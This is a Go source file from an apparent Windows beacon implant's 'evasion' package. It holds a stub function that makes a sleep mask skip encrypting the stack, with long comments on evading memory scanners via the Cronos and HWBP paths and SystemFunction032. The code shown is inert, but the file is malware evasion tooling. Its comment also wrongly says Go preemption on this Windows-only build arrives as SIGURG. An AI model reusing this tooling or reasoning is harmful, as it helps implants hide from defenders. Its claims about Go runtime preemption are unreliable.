//go:build windows && amd64

package evasion

// currentStackRegion returns a range that the sleep mask can
// safely encrypt without corrupting the Go runtime.
//
// The function deliberately returns (0, 0, nil). Reading the TEB's
// StackBase/StackLimit gives the OS thread stack bounds, not the
// goroutine stack bounds, and Go runs the beacon's frames on the
// goroutine stack. Encrypting the OS thread stack hides nothing
// the beacon cares about; encrypting the goroutine stack would
// require reading the g pointer from TLS and the runtime's stack
// fields, both of which change between Go releases.
//
// Returning (0, 0, nil) tells the caller to skip stack encryption.
// The Cronos and HWBP paths handle the zero-size case by not
// calling SystemFunction032 on the stack region.
//
// -----------------------------------------------------------------
// KNOWN LIMITATION: THE GOROUTINE STACK IS NOT ENCRYPTED.
//
// The beacon's call chain, local variables, and return addresses
// remain in plaintext on the goroutine stack throughout the sleep
// window. A memory scanner that walks the goroutine stack — which
// includes the Go runtime's own signal handler when it preempts
// the thread via SIGURG — sees the same data it would see without
// the mask.
//
// Do not "fix" this by reading the g pointer from TLS and
// encrypting the goroutine stack. The kernel delivers SIGURG to
// the thread for preemption, the Go runtime's handler runs on
// that thread, and if the handler walks a stack that is currently
// ciphertext the process dies with an access violation.
// -----------------------------------------------------------------
func currentStackRegion() (base, size uintptr, err error) {
    return 0, 0, nil
}